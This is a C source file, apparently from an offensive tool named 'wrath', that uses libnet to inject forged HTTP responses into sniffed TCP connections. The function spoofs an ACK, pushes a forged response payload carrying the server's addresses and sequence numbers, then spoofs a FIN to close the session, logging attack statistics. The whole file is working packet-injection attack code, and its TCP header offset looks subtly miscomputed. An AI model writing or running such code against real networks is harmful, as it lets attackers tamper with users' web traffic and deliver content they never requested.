#include <libnet.h>
#include "wrath-builders.h"
#include "wrath-structs.h"
#include "wrath-printers.h"

/* This assumes packets are being filtered where the client is the source. */
void wrath_launch_http_response(u_char *data_pass, const u_char *packet, u_char *payload, FILE *logfp) {
	
	struct lcp_package *package = (struct lcp_package *) data_pass;
	libnet_t *libnet_handle = package->libnet_handle;

	struct libnet_ipv4_hdr *iphdr;
	struct libnet_tcp_hdr *tcphdr;

	iphdr = (struct libnet_ipv4_hdr *) (packet + LIBNET_ETH_H);
	tcphdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);

	wrath_capture_stats(iphdr, tcphdr, logfp);

	// acknowledges client's http request
	wrath_tcp_custom_build_and_launch(libnet_handle, iphdr->ip_dst, iphdr->ip_src, ntohs(tcphdr->th_dport),
		ntohs(tcphdr->th_sport), ntohl(tcphdr->th_ack), ntohl(tcphdr->th_seq), TH_ACK);

	// launches forgered http response	
	wrath_tcp_belly_build_and_launch(data_pass, packet, payload, (TH_PUSH + TH_ACK));
	wrath_attack_packet_stats(iphdr, tcphdr, (TH_PUSH + TH_ACK), strlen(payload), logfp);
		
	// requests a connection tear-down
	wrath_tcp_custom_build_and_launch(libnet_handle, iphdr->ip_dst, iphdr->ip_src, ntohs(tcphdr->th_dport),
		ntohs(tcphdr->th_sport), ntohl(tcphdr->th_ack) + strlen(payload), ntohl(tcphdr->th_seq), (TH_FIN + TH_ACK));
}
